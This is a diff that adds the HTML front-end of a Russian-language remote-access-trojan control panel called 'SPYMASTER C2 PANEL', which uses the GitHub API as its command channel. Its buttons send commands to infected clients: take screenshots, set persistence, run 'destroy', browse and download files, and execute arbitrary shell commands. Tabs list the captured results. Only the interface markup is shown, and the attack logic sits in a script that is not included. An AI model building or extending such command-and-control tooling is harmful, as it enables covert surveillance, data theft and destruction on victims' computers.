@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SPYMASTER C2 PANEL</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <!-- Хакерский ASCII заголовок -->
+        <div class="ascii-header">
+            <pre>
+╔═══════════════════════════════════════════════════════════════════════════╗
+║  ███████╗██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗  ║
+║  ██╔════╝██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗ ║
+║  ███████╗██████╔╝ ╚████╔╝     ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝ ║
+║  ╚════██║██╔═══╝   ╚██╔╝      ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗ ║
+║  ███████║██║        ██║       ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║ ║
+║  ╚══════╝╚═╝        ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ ║
+║                                                                                   ║
+║                         GITHUB C2 PANEL v4.0                                      ║
+║                         АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ                               ║
+╚═══════════════════════════════════════════════════════════════════════════════════╝
+            </pre>
+        </div>
+
+        <!-- Статус подключения -->
+        <div class="status-bar">
+            <div class="status-indicator" id="statusIndicator"></div>
+            <span id="statusText">ПРОВЕРКА ПОДКЛЮЧЕНИЯ...</span>
+            <div class="stats" id="stats">
+                <span>📄 РЕЗУЛЬТАТОВ: <span id="resultsCount">0</span></span>
+                <span>📸 СКРИНШОТОВ: <span id="screensCount">0</span></span>
+                <span>💻 КЛИЕНТОВ: <span id="clientsCount">0</span></span>
+            </div>
+        </div>
+
+        <!-- Основной контент -->
+        <div class="main-content">
+            <!-- Левая панель - Команды -->
+            <div class="panel commands-panel">
+                <div class="panel-header">
+                    <span>🎯 ОТПРАВКА КОМАНД</span>
+                </div>
+                
+                <!-- Выбор клиента -->
+                <div class="client-select">
+                    <label>📱 ВЫБРАТЬ КЛИЕНТА:</label>
+                    <select id="clientSelect">
+                        <option value="all">ВСЕ КЛИЕНТЫ</option>
+                    </select>
+                </div>
+
+                <!-- Быстрые команды -->
+                <div class="quick-commands">
+                    <button class="cmd-btn" data-cmd="/info">📱 INFO</button>
+                    <button class="cmd-btn" data-cmd="/screenshot">📸 SCREEN</button>
+                    <button class="cmd-btn" data-cmd="/persist">🔒 PERSIST</button>
+                    <button class="cmd-btn" data-cmd="/destroy">💀 DESTROY</button>
+                </div>
+
+                <!-- Кастомная команда -->
+                <div class="custom-command">
+                    <input type="text" id="customCmd" placeholder="Введите команду...">
+                    <button id="sendCustomBtn">📨 ОТПРАВИТЬ</button>
+                </div>
+
+                <!-- Расширенные команды -->
+                <div class="advanced-commands">
+                    <div class="section-title">⚙️ РАСШИРЕННЫЕ КОМАНДЫ</div>
+                    <div class="cmd-group">
+                        <button class="cmd-small" data-cmd="/files C:\\">📁 FILES C:\</button>
+                        <button class="cmd-small" data-cmd="/files D:\\">📁 FILES D:\</button>
+                        <button class="cmd-small" data-cmd="/files C:\\Users">📁 FILES USERS</button>
+                    </div>
+                    <div class="cmd-group">
+                        <input type="text" id="downloadPath" placeholder="Путь к файлу (C:\file.txt)">
+                        <button class="cmd-small" id="downloadBtn">⬇️ DOWNLOAD</button>
+                    </div>
+                    <div class="cmd-group">
+                        <input type="text" id="shellCmd" placeholder="CMD команда (ipconfig)">
+                        <button class="cmd-small" id="shellBtn">💻 EXECUTE</button>
+                    </div>
+                </div>
+
+                <!-- Кнопки управления репозиторием -->
+                <div class="repo-controls">
+                    <button id="clearCommandsBtn" class="danger-btn">🗑 ОЧИСТИТЬ КОМАНДЫ</button>
+                    <button id="clearAllBtn" class="danger-btn">💣 ОЧИСТИТЬ ВСЁ</button>
+                    <button id="refreshBtn" class="info-btn">🔄 ОБНОВИТЬ</button>
+                </div>
+            </div>
+
+            <!-- Правая панель - Результаты -->
+            <div class="panel results-panel">
+                <div class="panel-header">
+                    <span>📥 РЕЗУЛЬТАТЫ</span>
+                    <div class="tabs">
+                        <button class="tab-btn active" data-tab="logs">📜 ЛОГИ</button>
+                        <button class="tab-btn" data-tab="clients">💻 КЛИЕНТЫ</button>
+                        <button class="tab-btn" data-tab="screens">🖼️ СКРИНШОТЫ</button>
+                        <button class="tab-btn" data-tab="files">📁 ФАЙЛЫ</button>
+                    </div>
+                </div>
+                
+                <!-- Вкладка ЛОГИ -->
+                <div id="logsTab" class="tab-content active">
+                    <div class="log-container" id="logContainer">
+                        <div class="log-entry system">[СИСТЕМА] Панель управления запущена</div>
+                        <div class="log-entry system">[СИСТЕМА] Ожидание подключения клиентов...</div>
+                    </div>
+                </div>
+
+                <!-- Вкладка КЛИЕНТЫ -->
+                <div id="clientsTab" class="tab-content">
+                    <div class="clients-list" id="clientsList">
+                        <div class="empty-message">Нет подключенных клиентов</div>
+                    </div>
+                </div>
+
+                <!-- Вкладка СКРИНШОТЫ -->
+                <div id="screensTab" class="tab-content">
+                    <div class="screens-grid" id="screensGrid">
+                        <div class="empty-message">Нет скриншотов</div>
+                    </div>
+                </div>
+
+                <!-- Вкладка ФАЙЛЫ -->
+                <div id="filesTab" class="tab-content">
+                    <div class="files-list" id="filesList">
+                        <div class="empty-message">Нет загруженных файлов</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Нижняя панель -->
+        <div class="footer">
+            <span>🔐 ЗАЩИЩЕННОЕ ПОДКЛЮЧЕНИЕ | GITHUB API</span>
+            <span>🐀 КРЫСА ГУБЕРНАТОРСКАЯ © 2024</span>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
